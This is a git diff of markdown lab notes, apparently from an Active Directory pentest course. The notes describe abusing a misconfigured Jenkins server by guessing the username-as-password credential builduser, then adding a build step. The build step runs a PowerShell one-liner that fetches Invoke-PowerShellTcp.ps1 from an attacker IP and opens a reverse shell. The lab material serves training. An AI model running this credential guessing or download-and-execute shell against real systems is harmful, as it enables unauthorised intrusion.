@@ -133,6 +133,7 @@ Invoke-AllChecks
 ```
 Abuse Jenkins Instance
 Next, let's try our hands on the Jenkins instance. To be able to execute commands on Jenkins server without admin access we must have privileges to Configure builds. We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080). If we go to the "People" page of Jenkins we can see the users present on the Jenkins instance. Remember to use Edge to open the Jenkins web console!
+
 <figure><img src="../assets/jenkins-1.png" alt=""><figcaption></figcaption></figure>
 
 Since Jenkins does not have a password policy many users use username as passwords even on the publicly available instances. By manually trying the usernames as passwords we can identify that the user builduser has password builduser. The user builduser can Configure builds and Add Build Steps which will help us in executing commands.
@@ -146,6 +147,7 @@ If using Invoke-PowerShellTcp, make sure to include the function call in the scr
 ```batch
 powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
 ```
+
 <figure><img src="../assets/jenkins-2.png" alt=""><figcaption></figcaption></figure>
 
 #### Save the configuration.
